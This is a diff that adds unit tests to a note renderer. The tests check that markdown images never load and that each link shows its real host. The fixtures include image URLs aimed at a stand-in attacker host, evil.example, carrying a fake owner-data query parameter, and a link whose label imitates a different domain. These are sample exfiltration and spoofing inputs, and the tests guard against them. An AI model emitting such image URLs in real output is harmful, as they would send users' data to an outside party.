@@ -36,6 +36,35 @@ describe("note renderer", () => {
     expect(link).toContain('href="https://a.b"');
   });
 
+  test("an image in a note never gets a source: it shows as its description and host", async () => {
+    const html = await renderNoteHtml(
+      [
+        "![chart](https://evil.example/leak?d=FAKE-OWNER-DATA-1234)",
+        "![ref image][r]",
+        '[r]: https://evil.example:8443/ref?d=FAKE-OWNER-DATA-1234 "t"',
+        "[![badge](https://evil.example/badge.png)](https://evil.example/target)",
+        "![local](/own.png)",
+      ].join("\n\n"),
+    );
+    expect(html).not.toMatch(/<(img|picture|source|video|iframe)\b/i);
+    expect(html).not.toMatch(/\s(src|srcset|poster)=/i);
+    expect(html).toContain("[Image not loaded: chart (evil.example)]");
+    expect(html).toContain("[Image not loaded: ref image (evil.example:8443)]");
+    expect(html).toContain("[Image not loaded: badge (evil.example)]");
+    expect(html).toContain("[Image not loaded: local]");
+    expect(html).not.toContain("FAKE-OWNER-DATA-1234");
+  });
+
+  test("a web link shows its full host beside the label", async () => {
+    const html = await renderNoteHtml(
+      "[docs](https://evil.example:8443/p?a=1&b=2) and [good.example](https://evil.example/x) and [mail](mailto:a@b.example)",
+    );
+    expect(html).toContain('href="https://evil.example:8443/p?a=1&amp;b=2">docs</a> <span class="note-link-host">(evil.example:8443)</span>');
+    expect(html).toContain('>good.example</a> <span class="note-link-host">(evil.example)</span>');
+    expect(html).toContain('>mail</a>');
+    expect(html).not.toContain("(b.example)");
+  });
+
   test("an output without main.fmd is an error, not an empty note", () => {
     expect(() => extractMain("<html></html>")).toThrow("main");
   });
